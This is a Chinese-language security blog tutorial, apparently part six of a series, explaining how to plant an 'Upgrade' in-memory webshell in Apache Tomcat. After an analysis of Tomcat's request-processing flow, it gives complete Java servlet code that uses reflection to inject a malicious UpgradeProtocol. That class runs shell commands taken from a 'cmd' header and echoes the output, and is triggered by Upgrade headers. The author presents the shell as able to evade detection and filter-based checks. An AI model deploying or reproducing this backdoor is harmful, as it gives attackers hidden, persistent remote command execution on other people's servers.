## 写在前面

前面讲解了一个特殊的Tomcat内存马-Executor内存马，这篇同样是一个特殊，可以不被检测到的内存马-Upgrade内存马。

这篇就是内存马系列文章的第六篇了。

## 前置

在阅读这篇文章之前，同样需要对Tomcat的架构，和初始化流程等方面有一定的了解，上篇中的Executor内存马主要是在Executor中的构造，对于Upgrade内存马来说，主要是在Processor中进行构造的。

### 什么是Processor?

Processor是一个接口，针对于不同协议下具有不同的具体实现类，其实现类的具体功能是处理http请求,主要是对协议进行解析，状态处理以及响应。然后起一个中间作用转发到
Adater。

首先来看一下实现关系类。

![image-20220914104214288.png](https://image.3001.net/images/20220921/1663732744_632a8c0807e0b85141fa7.png!small)

### 流程分析

在tomcat提供服务的时候，首先会创建一个线程，

之后将会调用`NioEndpoint#doRun`方法处理底层的网络Socket连接，

![image-20220914111310609.png](https://image.3001.net/images/20220921/1663732751_632a8c0f7b027cc885bd7.png!small)

因为这里的状态为OPEN, 所以我们调用了`AbstractProtocol$ConnectionHandler#process`方法进行处理。

![image-20220914113042344.png](https://image.3001.net/images/20220921/1663732758_632a8c163d617d86262ad.png!small)

如果这里的processor为空，将会创建一个processor，

![image-20220914113229520.png](https://image.3001.net/images/20220921/1663732772_632a8c2404aff73558e76.png!small)

默认创建为Http11Processor类，调用其process方法，

![image-20220914113409776.png](https://image.3001.net/images/20220921/1663732780_632a8c2c065fae2ab80b5.png!small)

在这里将会对status标记为OPEN_READ，调用了service方法，

![image-20220914113553473.png](https://image.3001.net/images/20220921/1663732786_632a8c32b314e2b8d7d8e.png!small)

在其中，如果存在有upgrade标识，将会通过getUpgradeProtocol方法获取对应的UpgradeProtocol对象，之后会调用其accept方法，

这里就是我们的利用点了。

## 正文

### 分析

前文提到了利用点的位置，我们接下来分析一下如果利用那个方法，

这里的Upgrade是一个接口，

![image-20220914114033161.png](https://image.3001.net/images/20220921/1663732794_632a8c3a0cccb17398bb8.png!small)

我们可以关注到他的由来，是通过`this.protocol`属性中调用了`getUpgradeProtocol`通过带入请求协议，取出了最后的upgradeProtocol，并调用了accept方法。

我们跟进一下看看`this.protocol`是个什么？

![image-20220914114234328.png](https://image.3001.net/images/20220921/1663732804_632a8c443071e5d6da299.png!small)

他是一个AbstractHttp11Protocol类，我们查看一下对应方法，

![image-20220914114436230.png](https://image.3001.net/images/20220921/1663732811_632a8c4b0a3efb7271f6f.png!small)

在其方法中，我们知道他是从属性`httpUpgradeProtocols`从取出对应数据的，我们跟进一下该属性。

![image-20220914114534145.png](https://image.3001.net/images/20220921/1663732820_632a8c540bcda2c27de01.png!small)

很明显我们可以看出他是一个Map对象，其key为String, Value为UpgradeProtocol

很明显了，就是通过key来获取对应的对象。

如果我们能够插入一个Map对象，其key为我们特定的值，value为一个恶意的实现了`UpgradeProtocol`接口的类，当我们传入特定的key值的时候，将会调用恶意类的accept方法，达到我们的恶意目的。

那么我们初步可以得到构造的流程，

首先创建一个实现了`UpgradeProtocol`接口的恶意类，

之后获取httpUpgradeProtocols属性，将key和恶意类写入属性中，

之后将修改后的httpUpgradeProtocols属性值还原，

那么，重点来了，怎样获取httpUpgradeProtocols属性的呢？

同样有好几种方式，可以按照上篇所说的那样，通过内存搜索工具，在当前线程中找到对应类，

但是这里可以直接从request中获取，就方便点，从这里获取。

![image-20220914190927651.png](https://image.3001.net/images/20220921/1663732831_632a8c5fb60f197680744.png!small)

我们能够获取到`AbstractProtocol$ConnectionHandler`这个对象，

其实现类为AbstractHttp11Protocol类，

可以从中取出`httpUpgradeProtocols`属性，

这是一个HashMap类，我们可以传入一个恶意的键值对。

可以大概总结一下流程：

  1. 反射获取`httpUpgradeProtocols`属性；

  2. 创建一个实现了`UpgradeProtocol`接口，并重写了accept方法的恶意类；

  3. 将恶意类put进入`httpUpgradeProtocols`属性；

  4. 将改造后的属性值传回给handler中去。

### 编写内存马

接下来我们按照上面分析出来的流程进行payload的编写。

首先是反射获取属性

    
    
    RequestFacade rf = (RequestFacade) req;
    Field requestField = RequestFacade.class.getDeclaredField("request");
    requestField.setAccessible(true);
    Request request1 = (Request) requestField.get(rf);
    
    Field connector = Request.class.getDeclaredField("connector");
    connector.setAccessible(true);
    Connector realConnector = (Connector) connector.get(request1);
    
    Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
    protocolHandlerField.setAccessible(true);
    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);
    
    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
    upgradeProtocolsField.setAccessible(true);
    upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
    

这里主要是通过反射的方式取出了属性值，

之后我们创建了一个恶意类，

    
    
    class MyUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }
    
        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }
    
        @Override
        public String getAlpnName() {
            return null;
        }
    
        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }
    
        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }
    
        @Override
        public boolean accept(org.apache.coyote.Request request) {
            String p = request.getHeader("cmd");
            try {
                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                response.setAccessible(true);
                Response resp = (Response) response.get(request);
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                resp.doWrite(ByteBuffer.wrap(result));
            } catch (Exception e) {
            }
            return false;
        }
    }
    

在accept中的逻辑中，首先判断他是什么系统环境，使用对应的命令执行方式，对于回显，直接从传入的request对象中封装了response对象，直接进行回显。

再然后，将其put进Map对象中，

    
    
    upgradeProtocols.put("hello", myUpgrade);
    

千万不要忘记，在修改换之后应该将其还回去，

    
    
    upgradeProtocolsField.set(handler, upgradeProtocols);
    

最后完整的payload，

    
    
    package pres.test.momenshell;
    
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    import org.apache.catalina.connector.Connector;
    import org.apache.catalina.connector.RequestFacade;
    import org.apache.catalina.connector.Request;
    import org.apache.coyote.Adapter;
    import org.apache.coyote.Processor;
    import org.apache.coyote.UpgradeProtocol;
    import org.apache.coyote.Response;
    import org.apache.coyote.http11.AbstractHttp11Protocol;
    import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
    import org.apache.tomcat.util.net.SocketWrapperBase;
    
    import java.lang.reflect.Field;
    import java.nio.ByteBuffer;
    import java.io.IOException;
    import java.util.HashMap;
    
    public class AddTomcatUpgrade extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            doPost(req, resp);
        }
    
        class MyUpgrade implements UpgradeProtocol {
            @Override
            public String getHttpUpgradeName(boolean b) {
                return null;
            }
    
            @Override
            public byte[] getAlpnIdentifier() {
                return new byte[0];
            }
    
            @Override
            public String getAlpnName() {
                return null;
            }
    
            @Override
            public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
                return null;
            }
    
            @Override
            public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {
                return null;
            }
    
            @Override
            public boolean accept(org.apache.coyote.Request request) {
                String p = request.getHeader("cmd");
                try {
                    String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                    Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                    response.setAccessible(true);
                    Response resp = (Response) response.get(request);
                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                    resp.doWrite(ByteBuffer.wrap(result));
                } catch (Exception e) {
                }
                return false;
            }
        }
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                RequestFacade rf = (RequestFacade) req;
                Field requestField = RequestFacade.class.getDeclaredField("request");
                requestField.setAccessible(true);
                Request request1 = (Request) requestField.get(rf);
    
                Field connector = Request.class.getDeclaredField("connector");
                connector.setAccessible(true);
                Connector realConnector = (Connector) connector.get(request1);
    
                Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
                protocolHandlerField.setAccessible(true);
                AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);
    
                HashMap<String, UpgradeProtocol> upgradeProtocols = null;
                Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
                upgradeProtocolsField.setAccessible(true);
                upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
    
                MyUpgrade myUpgrade = new MyUpgrade();
                upgradeProtocols.put("hello", myUpgrade);
    
                upgradeProtocolsField.set(handler, upgradeProtocols);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

![image-20220914174817399.png](https://image.3001.net/images/20220921/1663732858_632a8c7a97dcebfda396e.png!small)

千万不要忘记箭头所指的点。

为什么要加这些呢？

我们在前面提到过在漏洞触发点的位置有几个条件，

![image-20220914201210671.png](https://image.3001.net/images/20220921/1663732866_632a8c826c222cd0e62d3.png!small)

在判断`Connection`头为`Upgrade`的时候将会进入if语句，

之后再取出`Upgrade`头作为请求协议，

最后获取到对应的Upgradeprotocol类，如果为hello，就为我们的恶意类，

最后调用它的accept方法进行触发。

## 总结

好了，第六篇系列文章也就结束了，这篇和上一篇同样可以一定程度上绕过Filter鉴权机制导致内存马不可用的情况。

贴一下，总结的构造流程：

  1. 反射获取`httpUpgradeProtocols`属性；

  2. 创建一个实现了`UpgradeProtocol`接口，并重写了accept方法的恶意类；

  3. 将恶意类put进入`httpUpgradeProtocols`属性；

  4. 将改造后的属性值传回给handler中去。

## Reference

https://tttang.com/archive/1709

